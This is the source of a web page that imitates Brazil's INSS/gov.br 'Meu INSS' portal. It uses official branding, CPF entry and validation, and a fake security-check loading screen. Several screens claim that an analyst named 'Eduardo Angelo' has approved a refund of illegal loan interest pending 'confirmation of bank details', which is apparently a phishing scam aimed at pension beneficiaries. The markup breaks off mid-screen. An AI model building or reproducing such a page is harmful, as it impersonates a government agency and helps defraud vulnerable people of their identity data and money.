<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#1351B4">
    <title>Meu INSS - Previdência Social</title>
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'govbr-blue': '#1351B4',
                        'govbr-blue-warm-vivid-70': '#155BCB',
                        'govbr-blue-warm-20': '#C5D4EB',
                        'govbr-gray-2': '#F8F8F8',
                        'govbr-gray-20': '#CCCCCC',
                        'govbr-gray-80': '#555555',
                        'inss-green': '#168821',
                        'inss-yellow': '#FFCD07',
                    }
                }
            }
        }
    </script>
    <style>
        * {
            -webkit-tap-highlight-color: transparent;
        }
        body, html {
            font-family: 'Rawline', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            overscroll-behavior: none;
            margin: 0;
            padding: 0;
            background: #FFFFFF;
        }
        
        #root {
            min-height: 100vh;
            width: 100%;
        }
        
        .header-govbr {
            background: #1351B4;
            height: 56px;
            display: flex;
            align-items: center;
            padding: 0 16px;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .inss-card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
            transition: all 0.2s;
        }

        .inss-card:active {
            transform: scale(0.98);
            box-shadow: 0 1px 2px rgba(0,0,0,0.08);
        }

        /* Animações de transição de página */
        @keyframes fadeIn {
            from { 
                opacity: 0; 
                transform: translateY(20px) scale(0.98);
            }
            to { 
                opacity: 1; 
                transform: translateY(0) scale(1);
            }
        }
        
        @keyframes slideUp {
            from { 
                opacity: 0; 
                transform: translateY(40px);
            }
            to { 
                opacity: 1; 
                transform: translateY(0);
            }
        }

        @keyframes slideInRight {
            from { 
                opacity: 0; 
                transform: translateX(30px);
            }
            to { 
                opacity: 1; 
                transform: translateX(0);
            }
        }

        @keyframes scaleIn {
            from { 
                opacity: 0; 
                transform: scale(0.9);
            }
            to { 
                opacity: 1; 
                transform: scale(1);
            }
        }

        @keyframes pulse {
            0%, 100% { 
                opacity: 1; 
                transform: scale(1);
            }
            50% { 
                opacity: 0.8; 
                transform: scale(0.95);
            }
        }

        @keyframes shimmer {
            0% {
                background-position: -1000px 0;
            }
            100% {
                background-position: 1000px 0;
            }
        }
        
        .fade-in {
            animation: fadeIn 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        .slide-up {
            animation: slideUp 0.6s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .slide-in-right {
            animation: slideInRight 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .scale-in {
            animation: scaleIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        .pulse-animation {
            animation: pulse 2s ease-in-out infinite;
        }

        /* Container de transição */
        .page-container {
            animation: fadeIn 0.4s ease-out;
            will-change: transform, opacity;
        }

        input:focus, select:focus {
            outline: none;
        }

        .btn-govbr {
            background: #1351B4;
            color: white;
            border: none;
            border-radius: 100px;
            padding: 12px 24px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-govbr:hover {
            background: #155BCB;
        }

        .btn-govbr:active {
            transform: scale(0.98);
        }

        .btn-govbr:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-secondary {
            background: transparent;
            color: #1351B4;
            border: 2px solid #1351B4;
        }

        .btn-secondary:hover {
            background: #F8F8F8;
        }

        .input-govbr {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #CCCCCC;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.2s;
        }

        .input-govbr:focus {
            border-color: #1351B4;
            box-shadow: 0 0 0 3px rgba(19, 81, 180, 0.1);
        }

        .input-govbr.error {
            border-color: #E52207;
        }

        /* Ícones SVG simplificados */
        .icon-bell {
            width: 24px;
            height: 24px;
        }

        .icon-eye {
            width: 20px;
            height: 20px;
        }

        /* Animação de loading moderna */
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @keyframes spinReverse {
            to { transform: rotate(-360deg); }
        }

        @keyframes dotPulse {
            0%, 100% { 
                transform: scale(0.8);
                opacity: 0.5;
            }
            50% { 
                transform: scale(1.2);
                opacity: 1;
            }
        }

        @keyframes loadingBar {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(400%); }
        }

        /* CSS dos spinners circulares removido - agora usamos apenas barras de progresso */

        .loading-dots {
            display: flex;
            gap: 8px;
            align-items: center;
            justify-content: center;
            padding: 4px 0;
        }

        .loading-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #1351B4;
            animation: dotPulse 1.4s ease-in-out infinite;
        }

        .loading-dot:nth-child(2) {
            animation-delay: 0.2s;
        }

        .loading-dot:nth-child(3) {
            animation-delay: 0.4s;
        }

        .loading-bar-container {
            width: 100%;
            height: 4px;
            background: rgba(19, 81, 180, 0.1);
            border-radius: 2px;
            overflow: hidden;
            position: relative;
        }

        .loading-bar {
            position: absolute;
            height: 100%;
            width: 25%;
            background: linear-gradient(90deg, 
                transparent, 
                #1351B4, 
                transparent
            );
            animation: loadingBar 1.5s cubic-bezier(0.4, 0, 0.2, 1) infinite;
        }

        /* Badge de notificação */
        .badge-notification {
            background: #E52207;
            color: white;
            font-size: 10px;
            font-weight: bold;
            padding: 2px 6px;
            border-radius: 10px;
            position: absolute;
            top: -4px;
            right: -4px;
        }

        /* Senha input */
        .password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #666;
        }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        const { useState, useEffect } = React;

        // ========== UTILITÁRIOS ==========
        
        // Validação de CPF
        const validarCPF = (cpf) => {
            cpf = cpf.replace(/[^\d]/g, '');
            
            if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) {
                return false;
            }

            let soma = 0;
            let resto;

            for (let i = 1; i <= 9; i++) {
                soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
            }
            resto = (soma * 10) % 11;
            if (resto === 10 || resto === 11) resto = 0;
            if (resto !== parseInt(cpf.substring(9, 10))) return false;

            soma = 0;
            for (let i = 1; i <= 10; i++) {
                soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
            }
            resto = (soma * 10) % 11;
            if (resto === 10 || resto === 11) resto = 0;
            if (resto !== parseInt(cpf.substring(10, 11))) return false;

            return true;
        };

        // Máscara de CPF
        const formatarCPF = (valor) => {
            valor = valor.replace(/\D/g, '');
            valor = valor.substring(0, 11);
            valor = valor.replace(/(\d{3})(\d)/, '$1.$2');
            valor = valor.replace(/(\d{3})(\d)/, '$1.$2');
            valor = valor.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            return valor;
        };

        // Formatar data
        const formatarData = (data) => {
            return data.toLocaleDateString('pt-BR', { 
                day: '2-digit', 
                month: 'long', 
                year: 'numeric' 
            });
        };

        // ========== COMPONENTES ==========

        // Header Gov.br com Logos
        const HeaderGovBr = ({ titulo, mostrarSino = false, onClickSino }) => (
            <div className="header-govbr">
                <div className="flex items-center justify-between w-full max-w-md mx-auto">
                    {/* Logo Gov.br + INSS à esquerda */}
                    <div className="flex items-center gap-3">
                        {/* Logo Gov.br */}
                        <div className="flex items-center gap-2">
                            <svg width="28" height="28" viewBox="0 0 48 48" fill="white">
                                <path d="M24 4C12.95 4 4 12.95 4 24s8.95 20 20 20 20-8.95 20-20S35.05 4 24 4zm0 36c-8.82 0-16-7.18-16-16S15.18 8 24 8s16 7.18 16 16-7.18 16-16 16z"/>
                                <path d="M24 14c-5.52 0-10 4.48-10 10s4.48 10 10 10 10-4.48 10-10-4.48-10-10-10zm0 16c-3.31 0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6-2.69 6-6 6z"/>
                            </svg>
                            <div className="h-6 w-px bg-white opacity-40"></div>
                            {/* Mini Logo INSS */}
                            <img src="inss.png" alt="INSS" className="h-7 w-auto opacity-95" />
                        </div>
                    </div>

                    {/* Título centralizado */}
                    <div className="absolute left-1/2 transform -translate-x-1/2">
                        <span className="text-white font-semibold text-sm">{titulo}</span>
                    </div>

                    {/* Sino de notificação à direita */}
                    {mostrarSino && (
                        <div className="relative cursor-pointer" onClick={onClickSino}>
                            <svg className="icon-bell" viewBox="0 0 24 24" fill="white">
                                <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2zm-2 1H8v-6c0-2.48 1.51-4.5 4-4.5s4 2.02 4 4.5v6z"/>
                            </svg>
                            <span className="badge-notification">1</span>
                        </div>
                    )}
                    {!mostrarSino && <div className="w-6"></div>}
                </div>
            </div>
        );

        // Logo INSS
        const LogoINSS = () => (
            <div className="flex flex-col items-center mb-8 fade-in">
                <div className="mb-4">
                    <img 
                        src="inss.png" 
                        alt="INSS - Instituto Nacional do Seguro Social" 
                        className="h-20 w-auto"
                    />
                </div>
                <h1 className="text-2xl font-bold text-gray-800">Restituição INSS</h1>
            </div>
        );

        // Botão com ícone
        const Button = ({ children, onClick, disabled, variant = "primary", icon }) => {
            const baseClasses = "w-full py-3 rounded-full font-semibold text-base transition-all transform active:scale-98 disabled:transform-none";
            const variantClasses = variant === "primary"
                ? "btn-govbr"
                : "btn-secondary";
            
            return (
                <button
                    onClick={onClick}
                    disabled={disabled}
                    className={`${baseClasses} ${variantClasses}`}
                >
                    {icon && <span>{icon}</span>}
                    {children}
                </button>
            );
        };

        // Input com label
        const InputField = ({ label, value, onChange, error, placeholder, type = "text", maxLength, helper }) => {
            const [showPassword, setShowPassword] = useState(false);
            const inputType = type === "password" && showPassword ? "text" : type;

            return (
                <div className="mb-4 slide-up">
                    <label className="block text-gray-700 text-sm font-semibold mb-2">
                        {label}
                    </label>
                    <div className="relative">
                        <input
                            type={inputType}
                            value={value}
                            onChange={onChange}
                            placeholder={placeholder}
                            maxLength={maxLength}
                            className={`input-govbr ${error ? 'error' : ''}`}
                        />
                        {type === "password" && (
                            <div 
                                className="password-toggle"
                                onClick={() => setShowPassword(!showPassword)}
                            >
                                {showPassword ? (
                                    <svg className="icon-eye" viewBox="0 0 24 24" fill="currentColor">
                                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                                    </svg>
                                ) : (
                                    <svg className="icon-eye" viewBox="0 0 24 24" fill="currentColor">
                                        <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
                                    </svg>
                                )}
                            </div>
                        )}
                    </div>
                    {helper && !error && (
                        <p className="text-gray-500 text-xs mt-1">{helper}</p>
                    )}
                    {error && (
                        <p className="text-red-600 text-sm mt-1 font-medium fade-in">{error}</p>
                    )}
                </div>
            );
        };

        // Loading Screen Moderno com Barra
        const LoadingScreen = ({ mensagem = "Carregando...", submensagem = "" }) => {
            const [progresso, setProgresso] = useState(0);
            const [statusAtual, setStatusAtual] = useState("Verificando segurança do dispositivo");

            useEffect(() => {
                // Progresso linear para completar em 5 segundos
                const totalDuracao = 5000; // 5 segundos
                const intervaloAtualizacao = 50; // Atualiza a cada 50ms
                const incrementoPorAtualizacao = (100 / totalDuracao) * intervaloAtualizacao;

                const interval = setInterval(() => {
                    setProgresso(prev => {
                        if (prev >= 100) {
                            clearInterval(interval);
                            return 100;
                        }

                        const novoProgresso = prev + incrementoPorAtualizacao;

                        // Atualiza status baseado no progresso
                        if (novoProgresso < 33) {
                            setStatusAtual("Verificando segurança do dispositivo");
                        } else if (novoProgresso < 66) {
                            setStatusAtual("Verificando os seus dados");
                        } else {
                            setStatusAtual("Verificando liberação de acesso");
                        }

                        return Math.min(novoProgresso, 100);
                    });
                }, intervaloAtualizacao);

                return () => clearInterval(interval);
            }, []);

            return (
                <div className="page-container min-h-screen bg-gray-50 flex items-center justify-center px-6">
                    <div className="w-full max-w-md text-center">
                        {/* Logo INSS */}
                        <div className="flex justify-center mb-10">
                            <img src="inss.png" alt="INSS" className="h-16 w-auto" />
                        </div>
                        
                        {/* Status atual */}
                        <div className="mb-10">
                            <p className="text-gray-800 text-lg font-medium mb-3">
                                {statusAtual}
                            </p>
                            <div className="flex items-center justify-center gap-2">
                                <div className="w-2 h-2 bg-govbr-blue rounded-full animate-pulse"></div>
                                <div className="w-2 h-2 bg-govbr-blue rounded-full animate-pulse" style={{ animationDelay: '0.2s' }}></div>
                                <div className="w-2 h-2 bg-govbr-blue rounded-full animate-pulse" style={{ animationDelay: '0.4s' }}></div>
                            </div>
                        </div>
                        
                        {/* Barra de progresso */}
                        <div className="mb-8">
                            <div className="flex justify-between items-center mb-4">
                                <span className="text-sm font-medium text-gray-600">Progresso</span>
                                <span className="text-3xl font-bold text-govbr-blue">{Math.round(progresso)}%</span>
                            </div>
                            <div className="relative w-full h-2 bg-gray-200 rounded-full overflow-hidden">
                                <div 
                                    className="absolute h-full bg-gradient-to-r from-govbr-blue via-blue-500 to-govbr-blue transition-all duration-300 ease-out rounded-full"
                                    style={{ 
                                        width: `${progresso}%`,
                                        backgroundSize: '200% 100%',
                                        animation: 'shimmer 2s infinite'
                                    }}
                                ></div>
                            </div>
                        </div>
                        
                        
                    </div>
                </div>
            );
        };

        // ========== TELAS ==========

        // Tela 1: Inicial com botão Gov.br
        const TelaInicial = ({ onEntrar }) => (
            <div className="page-container min-h-screen bg-gray-50 flex flex-col">
                <div className="flex-1 flex flex-col items-center justify-center px-6 pb-20">
                    <LogoINSS />
                    
                    <div className="w-full max-w-sm space-y-4 mt-8">
                        <p className="text-center text-gray-600 mb-6">
                            Clique no botão abaixo para entrar no Restituição INSS ou cadastrar sua senha para outra pessoa. Ela é individual e intransferível.
                        </p>
                        
                        <Button 
                            onClick={onEntrar}
                            icon={
                                <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
                                    <path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
                                </svg>
                            }
                        >
                            Entrar com CPF
                        </Button>

                        <div className="pt-6">
                            <p className="text-center text-sm text-gray-600 mb-3">Serviços sem senha</p>
                            
                            <div className="grid grid-cols-3 gap-4">
                                <div className="flex flex-col items-center">
                                    <div className="w-16 h-16 bg-white rounded-2xl shadow-sm flex items-center justify-center mb-2">
                                        <svg width="32" height="32" viewBox="0 0 24 24" fill="#1351B4">
                                            <path d="M19 3h-4.18C14.4 1.84 13.3 1 12 1c-1.3 0-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm2 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/>
                                        </svg>
                                    </div>
                                    <span className="text-xs text-center text-gray-700">Extrato Guia de Pagamento (GPS)</span>
                                </div>
                                
                                <div className="flex flex-col items-center">
                                    <div className="w-16 h-16 bg-white rounded-2xl shadow-sm flex items-center justify-center mb-2">
                                        <svg width="32" height="32" viewBox="0 0 24 24" fill="#1351B4">
                                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                                        </svg>
                                    </div>
                                    <span className="text-xs text-center text-gray-700">Adesão de Dependente NIT</span>
                                </div>
                                
                                <div className="flex flex-col items-center">
                                    <div className="w-16 h-16 bg-white rounded-2xl shadow-sm flex items-center justify-center mb-2">
                                        <svg width="32" height="32" viewBox="0 0 24 24" fill="#1351B4">
                                            <path d="M20 6h-2.18c.11-.31.18-.65.18-1 0-1.66-1.34-3-3-3-1.05 0-1.96.54-2.5 1.35l-.5.67-.5-.68C10.96 2.54 10.05 2 9 2 7.34 2 6 3.34 6 5c0 .35.07.69.18 1H4c-1.11 0-1.99.89-1.99 2L2 19c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2zm-5-2c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zM9 4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm11 15H4v-2h16v2zm0-5H4V8h5.08L7 10.83 8.62 12 11 8.76l1-1.36 1 1.36L15.38 12 17 10.83 14.92 8H20v6z"/>
                                        </svg>
                                    </div>
                                    <span className="text-xs text-center text-gray-700">Inscrever no NIT/PIS</span>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div className="mt-8 text-center">
                        <a href="#" className="text-govbr-blue text-sm font-medium">
                            Entenda a conta gov.br
                        </a>
                    </div>
                </div>

                {/* Logos Gov.br na parte inferior */}
                <div className="bg-white border-t border-gray-200 px-6 py-6">
                    <div className="flex items-center justify-center gap-6 mb-4">
                        <img src="govbr.png" alt="gov.br" className="h-8 w-auto opacity-80" />
                        <div className="h-8 w-px bg-gray-300"></div>
                        <img src="govlogo.png" alt="Governo Federal" className="h-10 w-auto opacity-80" />
                    </div>
                    
                </div>
            </div>
        );

        // Tela 2: Fechar (identificação CPF)
        const TelaIdentificacao = ({ cpf, setCpf, onContinuar, onVoltar }) => {
            const [erro, setErro] = useState('');

            const handleChange = (e) => {
                const valorFormatado = formatarCPF(e.target.value);
                setCpf(valorFormatado);
                setErro('');
            };

            const handleContinuar = () => {
                const cpfLimpo = cpf.replace(/\D/g, '');
                
                if (cpfLimpo.length !== 11) {
                    setErro('CPF incompleto. Digite os 11 dígitos.');
                    return;
                }
                
                if (!validarCPF(cpfLimpo)) {
                    setErro('CPF inválido. Verifique os números digitados.');
                    return;
                }
                
                onContinuar();
            };

            const cpfValido = cpf.replace(/\D/g, '').length === 11 && validarCPF(cpf.replace(/\D/g, ''));

            return (
                <div className="page-container">
                    <HeaderGovBr titulo="Fechar" />
                    <div className="min-h-screen bg-white">
                        <div className="max-w-md mx-auto px-6 py-8">
                            <div className="mb-6">
                                <button onClick={onVoltar} className="text-govbr-blue flex items-center gap-2 mb-6">
                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                                        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                                    </svg>
                                    Voltar
                                </button>
                                <h2 className="text-2xl font-bold text-gray-800 mb-2">Identifique-se no gov.br com:</h2>
                            </div>

                            <div className="space-y-4">
                                <div className="flex items-center gap-3 p-4 border-2 border-govbr-blue rounded-lg bg-blue-50">
                                    <div className="w-6 h-6 rounded-full border-2 border-govbr-blue flex items-center justify-center">
                                        <div className="w-3 h-3 rounded-full bg-govbr-blue"></div>
                                    </div>
                                    <span className="font-semibold text-gray-800">Número do CPF</span>
                                </div>

                                <InputField
                                    label="Digite seu CPF"
                                    value={cpf}
                                    onChange={handleChange}
                                    error={erro}
                                    placeholder="000.000.000-00"
                                    maxLength={14}
                                />

                                <p className="text-sm text-gray-600">
                                    Digite os 11 números do seu CPF para acessar sua Restituição.
                                </p>

                                <Button onClick={handleContinuar} disabled={!cpfValido}>
                                    Continuar
                                </Button>

                                <div className="pt-4 space-y-3">
                                    <button className="w-full py-3 text-govbr-blue font-medium border border-gray-300 rounded-full">
                                        Outras opções de identificação
                                    </button>
                                </div>

                                <div className="pt-4 text-center">
                                    <p className="text-sm text-gray-600 mb-2">Ficou com dúvidas?</p>
                                    <a href="#" className="text-govbr-blue text-sm font-medium">
                                        Esqueci minha senha
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            );
        };

        // Tela 3: Aviso de Restituição Liberada
        const TelaAvisoRestituicao = ({ cpf, onContinuar }) => {
            return (
                <div className="page-container">
                    <HeaderGovBr titulo="Restituição INSS" />
                    <div className="min-h-screen bg-gray-50 flex items-center justify-center py-4">
                        <div className="max-w-md mx-auto px-6 w-full">
                            <div className="bg-white rounded-xl p-5 shadow-xl border-2 border-green-500 mb-4">
                                {/* Header principal com ícone */}
                                <div className="text-center mb-4">
                                    <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
                                        <svg width="32" height="32" viewBox="0 0 24 24" fill="#168821">
                                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                                        </svg>
                                    </div>
                                    <h2 className="text-xl font-bold text-gray-800 mb-1">Restituição de Juros</h2>
                                    <p className="text-xs text-gray-600">Devolução de valores cobrados acima do permitido pelo BC</p>
                                </div>

                                {/* Badge de aprovação destacado */}
                                <div className="flex justify-center mb-4">
                                    <div className="bg-green-500 text-white px-5 py-1.5 rounded-full text-xs font-bold shadow-lg">
                                        ✓ APROVADO PELO ANALISTA
                                    </div>
                                </div>

                                {/* Card do analista */}
                                <div className="bg-gradient-to-br from-blue-50 to-blue-100 rounded-lg p-4 mb-4 border border-blue-200">
                                    <div className="flex items-center gap-3 mb-3">
                                        <div className="w-12 h-12 bg-govbr-blue rounded-full flex items-center justify-center flex-shrink-0 shadow-md">
                                            <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
                                                <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                                            </svg>
                                        </div>
                                        <div className="flex-1">
                                            <p className="text-xs text-gray-600 mb-0.5">Analista Responsável</p>
                                            <p className="font-bold text-gray-900 text-base">Eduardo Angelo</p>
                                            <p className="text-xs text-gray-600">Analista de Seguro Social INSS</p>
                                        </div>
                                    </div>
                                    <div className="bg-white/70 rounded-lg p-3 border border-blue-200">
                                        <p className="text-xs text-gray-700 leading-snug">
                                            <span className="font-semibold text-govbr-blue">Prezado(a) beneficiário(a),</span><br/>
                                            Identificamos cobranças de <span className="font-bold text-red-600">juros acima do limite permitido pelo Banco Central</span> em seu empréstimo consignado. 
                                            Sua restituição foi <span className="font-bold text-green-700">APROVADA</span> e está liberada para devolução mediante confirmação de dados bancários.
                                        </p>
                                    </div>
                                </div>

                                
                            </div>

                            <Button onClick={onContinuar}>
                                Continuar
                            </Button>

                            {/* Logos Gov.br na parte inferior */}
                            <div className="mt-4 pt-4 border-t border-gray-200">
                                <div className="flex items-center justify-center gap-4">
                                    <img src="govbr.png" alt="gov.br" className="h-6 w-auto opacity-70" />
                                    <div className="h-6 w-px bg-gray-300"></div>
                                    <img src="govlogo.png" alt="Governo Federal" className="h-8 w-auto opacity-70" />
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            );
        };

        // Tela 4: Valores Disponíveis para Restituição
        const TelaValoresDisponiveis = ({ onContinuar, mostrarNotificacao, setMostrarNotificacao }) => {
            return (
                <div className="page-container">
                    <HeaderGovBr titulo="Restituição INSS" mostrarSino={true} onClickSino={() => setMostrarNotificacao(!mostrarNotificacao)} />
                    
                    {/* Modal de Notificação */}
                    {mostrarNotificacao && (
                        <div className="fixed inset-0 bg-black/50 flex items-start justify-center z-50 pt-16 px-4" onClick={() => setMostrarNotificacao(false)}>
                            <div className="bg-white rounded-xl shadow-2xl max-w-md w-full fade-in" onClick={(e) => e.stopPropagation()}>
                                <div className="p-4 border-b border-gray-200 flex items-center justify-between">
                                    <h3 className="font-bold text-gray-800">Notificações</h3>
                                    <button onClick={() => setMostrarNotificacao(false)} className="text-gray-400 hover:text-gray-600">
                                        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
                                        </svg>
                                    </button>
                                </div>
                                <div className="p-4">
                                    <div className="bg-green-50 border-l-4 border-green-500 p-4 rounded-r-lg">
                                        <div className="flex items-start gap-3">
                                            <div className="w-10 h-10 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0">
                                                <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
                                                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                                                </svg>
                                            </div>
                                            <div className="flex-1">
                                                <p className="font-bold text-gray-800 mb-1">Restituição de Juros</p>
                                                <p className="text-sm text-gray-600 mb-2">Valores cobrados acima do permitido pelo BC em empréstimo consignado foram identificados pelo analista Eduardo Angelo</p>
                                                <p className="text-xs text-gray-500">Hoje às 14:30</p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    )}

                    <div className="min-h-screen bg-gray-50">
                        <div className="max-w-md mx-auto px-6 py-4">
                            <div className="bg-white rounded-xl p-4 shadow-sm border border-gray-200 mb-4">
                                <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
                                    <svg width="24" height="24" viewBox="0 0 24 24" fill="#168821">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                                    </svg>
                                </div>
                                <h3 className="text-lg font-bold text-center text-gray-800 mb-1">Restituição de Juros</h3>
                                <p className="text-center text-gray-600 text-xs mb-3">Valores cobrados acima do permitido pelo Banco Central em empréstimos consignados</p>
                                
                                {/* Aviso do analista em destaque */}
                                <div className="bg-gradient-to-br from-blue-600 to-govbr-blue rounded-lg p-4 text-white text-center mb-3">
                                    <div className="flex justify-center mb-2">
                                        <svg width="32" height="32" viewBox="0 0 24 24" fill="white" className="opacity-90">
                                            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                                        </svg>
                                    </div>
                                    <p className="text-base font-bold mb-1">Valor informado pelo Analista</p>
                                    <p className="text-xs opacity-90 leading-snug">
                                        O valor da restituição referente a juros acima do limite do Banco Central será informado pelo analista durante o seu atendimento.
                                    </p>
                                </div>

                                {/* Card do analista */}
                                <div className="bg-blue-50 rounded-lg p-3 border border-blue-200">
                                    <div className="flex items-center gap-2 mb-2">
                                        <div className="w-10 h-10 bg-govbr-blue rounded-full flex items-center justify-center flex-shrink-0">
                                            <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
                                                <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                                            </svg>
                                        </div>
                                        <div>
                                            <p className="text-xs text-gray-600">Analista Responsável</p>
                                            <p className="font-bold text-gray-900 text-sm">Eduardo Angelo</p>
                                            <p className="text-xs text-gray-600">INSS - Seguro Social</p>
                                        </div>
                                    </div>
                                    <div className="bg-white rounded-lg p-2 border border-blue-100">
                                        <p className="text-xs text-gray-700 leading-snug">
                                            O valor será confirmado pelo analista após a validação dos seus dados bancários.
                                        </p>
                                    </div>
                                </div>
                            </div>

                            <div className="bg-white rounded-xl p-4 shadow-sm border border-gray-200 mb-4">
                                <h4 className="font-semibold text-gray-800 mb-3 text-sm">Detalhes da Restituição</h4>
                                <div className="space-y-2 text-xs">
                                    <div className="flex justify-between py-1.5 border-b border-gray-100">
                                        <span className="text-gray-600">Benefício:</span>
                                        <span className="font-semibold text-gray-800">Oculto</span>
                                    </div>
                                    <div className="flex justify-between py-1.5 border-b border-gray-100">
                                        <span className="text-gray-600">Competência:</span>
                                        <span className="font-semibold text-gray-800">11/2025</span>
                                    </div>
                                    <div className="flex justify-between py-1.5 border-b border-gray-100">
                                        <span className="text-gray-600">Tipo:</span>
                                        <span className="font-semibold text-gray-800">Devolução de Juros</span>
                                    </div>
                                    <div className="flex justify-between py-1.5">
                                        <span className="text-gray-600">Motivo:</span>
